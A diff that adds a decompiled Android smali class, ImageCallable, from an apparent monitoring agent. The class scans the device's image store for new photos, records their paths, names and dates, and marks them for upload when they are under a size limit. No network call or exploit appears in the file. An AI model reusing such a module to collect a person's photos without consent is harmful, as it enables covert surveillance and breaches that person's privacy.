@@ -1,0 +1,566 @@
+.class public Lcom/hp/vd/module/monitor/image/ImageCallable;
+.super Ljava/lang/Object;
+.source "ImageCallable.java"
+
+# interfaces
+.implements Ljava/util/concurrent/Callable;
+
+
+# annotations
+.annotation system Ldalvik/annotation/Signature;
+    value = {
+        "Ljava/lang/Object;",
+        "Ljava/util/concurrent/Callable<",
+        "Ljava/lang/Void;",
+        ">;"
+    }
+.end annotation
+
+
+# static fields
+.field protected static final TAG:Ljava/lang/String; = "ImageCallable"
+
+
+# instance fields
+.field protected contentResolver:Landroid/content/ContentResolver;
+
+.field protected contentUri:Landroid/net/Uri;
+
+.field protected dao:Lcom/j256/ormlite/dao/Dao;
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "Lcom/j256/ormlite/dao/Dao<",
+            "Lcom/hp/vd/data/ImageData;",
+            "Ljava/lang/Integer;",
+            ">;"
+        }
+    .end annotation
+.end field
+
+.field protected imageObserver:Lcom/hp/vd/module/monitor/image/ImageObserver;
+
+.field protected log:Lcom/hp/vd/agent/log/IWriter;
+
+.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "Lcom/j256/ormlite/dao/Dao<",
+            "Lcom/hp/vd/data/ModuleData;",
+            "Ljava/lang/Integer;",
+            ">;"
+        }
+    .end annotation
+.end field
+
+.field protected moduleData:Lcom/hp/vd/data/ModuleData;
+
+
+# direct methods
+.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/image/ImageObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
+    .locals 1
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "(",
+            "Landroid/content/ContentResolver;",
+            "Landroid/net/Uri;",
+            "Lcom/j256/ormlite/dao/Dao<",
+            "Lcom/hp/vd/data/ImageData;",
+            "Ljava/lang/Integer;",
+            ">;",
+            "Lcom/hp/vd/data/ModuleData;",
+            "Lcom/hp/vd/module/monitor/image/ImageObserver;",
+            "Lcom/j256/ormlite/dao/Dao<",
+            "Lcom/hp/vd/data/ModuleData;",
+            "Ljava/lang/Integer;",
+            ">;",
+            "Lcom/hp/vd/agent/log/IWriter;",
+            ")V"
+        }
+    .end annotation
+
+    .line 42
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    const/4 v0, 0x0
+
+    .line 26
+    iput-object v0, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->contentResolver:Landroid/content/ContentResolver;
+
+    .line 27
+    iput-object v0, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->contentUri:Landroid/net/Uri;
+
+    .line 28
+    iput-object v0, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->dao:Lcom/j256/ormlite/dao/Dao;
+
+    .line 29
+    iput-object v0, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleData:Lcom/hp/vd/data/ModuleData;
+
+    .line 30
+    iput-object v0, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->imageObserver:Lcom/hp/vd/module/monitor/image/ImageObserver;
+
+    .line 31
+    iput-object v0, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;
+
+    .line 32
+    iput-object v0, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    .line 43
+    iput-object p1, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->contentResolver:Landroid/content/ContentResolver;
+
+    .line 44
+    iput-object p2, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->contentUri:Landroid/net/Uri;
+
+    .line 45
+    iput-object p3, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->dao:Lcom/j256/ormlite/dao/Dao;
+
+    .line 46
+    iput-object p4, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleData:Lcom/hp/vd/data/ModuleData;
+
+    .line 47
+    iput-object p5, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->imageObserver:Lcom/hp/vd/module/monitor/image/ImageObserver;
+
+    .line 48
+    iput-object p6, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;
+
+    .line 49
+    iput-object p7, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public bridge synthetic call()Ljava/lang/Object;
+    .locals 1
+    .annotation system Ldalvik/annotation/Throws;
+        value = {
+            Ljava/lang/Exception;
+        }
+    .end annotation
+
+    .line 21
+    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/image/ImageCallable;->call()Ljava/lang/Void;
+
+    move-result-object v0
+
+    return-object v0
+.end method
+
+.method public call()Ljava/lang/Void;
+    .locals 12
+    .annotation system Ldalvik/annotation/Throws;
+        value = {
+            Ljava/sql/SQLException;
+        }
+    .end annotation
+
+    const/4 v0, 0x4
+
+    .line 61
+    new-array v0, v0, [Ljava/lang/String;
+
+    const-string v1, "_id"
+
+    const/4 v2, 0x0
+
+    aput-object v1, v0, v2
+
+    const-string v1, "_data"
+
+    const/4 v3, 0x1
+
+    aput-object v1, v0, v3
+
+    const-string v1, "_display_name"
+
+    const/4 v3, 0x2
+
+    aput-object v1, v0, v3
+
+    const-string v1, "datetaken"
+
+    const/4 v3, 0x3
+
+    aput-object v1, v0, v3
+
+    const/4 v0, 0x0
+
+    .line 69
+    :try_start_0
+    iget-object v4, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->contentResolver:Landroid/content/ContentResolver;
+
+    iget-object v5, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->contentUri:Landroid/net/Uri;
+
+    const/4 v6, 0x0
+
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v7, "_id > "
+
+    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    iget-object v7, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleData:Lcom/hp/vd/data/ModuleData;
+
+    const-string v8, "max_internal_image_id"
+
+    .line 72
+    invoke-virtual {v7, v8}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v7
+
+    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v7
+
+    const/4 v8, 0x0
+
+    const-string v9, "_id"
+
+    .line 69
+    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+
+    move-result-object v1
+    :try_end_0
+    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_0
+
+    if-nez v1, :cond_0
+
+    .line 84
+    iget-object v1, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    const-string v2, "ImageCallable"
+
+    new-instance v4, Ljava/lang/StringBuilder;
+
+    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v5, "Could not open a cursor for: "
+
+    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    iget-object v5, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->contentUri:Landroid/net/Uri;
+
+    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v4
+
+    invoke-interface {v1, v2, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
+
+    return-object v0
+
+    .line 93
+    :cond_0
+    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I
+
+    move-result v3
+
+    .line 95
+    iget-object v4, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    const-string v5, "ImageCallable"
+
+    new-instance v6, Ljava/lang/StringBuilder;
+
+    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v7, "call(): total entries: "
+
+    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    const-string v7, " with _id > "
+
+    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    iget-object v7, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleData:Lcom/hp/vd/data/ModuleData;
+
+    const-string v8, "max_internal_image_id"
+
+    .line 97
+    invoke-virtual {v7, v8}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v7
+
+    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v6
+
+    .line 95
+    invoke-interface {v4, v5, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
+
+    if-nez v3, :cond_1
+
+    .line 101
+    iget-object v1, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    const-string v2, "ImageCallable"
+
+    const-string v3, "No entries. Exiting..."
+
+    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
+
+    return-object v0
+
+    :cond_1
+    const/4 v3, -0x1
+
+    move v4, v3
+
+    .line 109
+    :goto_0
+    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z
+
+    move-result v5
+
+    if-eqz v5, :cond_3
+
+    const-string v5, "_data"
+
+    .line 110
+    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v5
+
+    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 111
+    new-instance v6, Ljava/io/File;
+
+    invoke-direct {v6, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    .line 113
+    invoke-virtual {v6}, Ljava/io/File;->length()J
+
+    move-result-wide v7
+
+    iget-object v9, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleData:Lcom/hp/vd/data/ModuleData;
+
+    const-string v10, "max_file_upload_size"
+
+    invoke-virtual {v9, v10}, Lcom/hp/vd/data/ModuleData;->customGetLong(Ljava/lang/String;)Ljava/lang/Long;
+
+    move-result-object v9
+
+    invoke-virtual {v9}, Ljava/lang/Long;->longValue()J
+
+    move-result-wide v9
+
+    cmp-long v11, v7, v9
+
+    if-lez v11, :cond_2
+
+    .line 114
+    iget-object v7, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    const-string v8, "ImageCallable"
+
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v10, "The file at: "
+
+    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v5, " ("
+
+    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    .line 116
+    invoke-virtual {v6}, Ljava/io/File;->length()J
+
+    move-result-wide v5
+
+    const-wide/16 v10, 0x400
+
+    div-long/2addr v5, v10
+
+    div-long/2addr v5, v10
+
+    invoke-virtual {v9, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
+
+    const-string v5, "MB.) is bigger than "
+
+    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v5, "max_file_upload_size"
+
+    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v5, ". Skipping this record."
+
+    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 114
+    invoke-interface {v7, v8, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
+
+    goto :goto_0
+
+    :cond_2
+    add-int/lit8 v2, v2, 0x1
+
+    .line 129
+    new-instance v4, Lcom/hp/vd/data/ImageData;
+
+    invoke-direct {v4}, Lcom/hp/vd/data/ImageData;-><init>()V
+
+    const-string v6, "_id"
+
+    .line 131
+    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v6
+
+    invoke-interface {v1, v6}, Landroid/database/Cursor;->getInt(I)I
+
+    move-result v6
+
+    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
+
+    move-result-object v6
+
+    iput-object v6, v4, Lcom/hp/vd/data/ImageData;->internalId:Ljava/lang/Integer;
+
+    .line 133
+    iput-object v5, v4, Lcom/hp/vd/data/ImageData;->url:Ljava/lang/String;
+
+    const-string v5, "_display_name"
+
+    .line 134
+    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v5
+
+    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v5
+
+    iput-object v5, v4, Lcom/hp/vd/data/ImageData;->name:Ljava/lang/String;
+
+    const-string v5, "datetaken"
+
+    .line 136
+    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v5
+
+    invoke-interface {v1, v5}, Landroid/database/Cursor;->getLong(I)J
+
+    move-result-wide v5
+
+    invoke-static {v5, v6}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;
+
+    move-result-object v5
+
+    .line 137
+    new-instance v6, Ljava/util/Date;
+
+    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J
+
+    move-result-wide v7
+
+    invoke-direct {v6, v7, v8}, Ljava/util/Date;-><init>(J)V
+
+    iput-object v6, v4, Lcom/hp/vd/data/ImageData;->createdAt:Ljava/util/Date;
+
+    .line 143
+    iget-object v5, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->dao:Lcom/j256/ormlite/dao/Dao;
+
+    invoke-interface {v5, v4}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I
+
+    .line 145
+    iget-object v4, v4, Lcom/hp/vd/data/ImageData;->internalId:Ljava/lang/Integer;
+
+    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I
+
+    move-result v4
+
+    goto/16 :goto_0
+
+    .line 148
+    :cond_3
+    iget-object v5, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    const-string v6, "ImageCallable"
+
+    new-instance v7, Ljava/lang/StringBuilder;
+
+    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v8, "run(): images listed = "
+
+    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-interface {v5, v6, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
+
+    .line 150
+    invoke-interface {v1}, Landroid/database/Cursor;->isClosed()Z
+
+    move-result v2
+
+    if-nez v2, :cond_4
+
+    .line 151
+    invoke-interface {v1}, Landroid/database/Cursor;->close()V
+
+    :cond_4
+    if-eq v4, v3, :cond_5
+
+    .line 155
+    iget-object v1, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleData:Lcom/hp/vd/data/ModuleData;
+
+    const-string v2, "max_internal_image_id"
+
+    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;
+
+    move-result-object v3
+
+    invoke-virtual {v1, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V
+
+    .line 156
+    iget-object v1, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;
+
+    iget-object v2, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->moduleData:Lcom/hp/vd/data/ModuleData;
+
+    invoke-interface {v1, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
+
+    :cond_5
+    return-object v0
+
+    :catch_0
+    move-exception v1
+
+    .line 78
+    iget-object v2, p0, Lcom/hp/vd/module/monitor/image/ImageCallable;->log:Lcom/hp/vd/agent/log/IWriter;
+
+    const-string v3, "ImageCallable"
+
+    const-string v4, "SQLiteException caught while quering contentResolver"
+
+    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z
+
+    return-object v0
+.end method
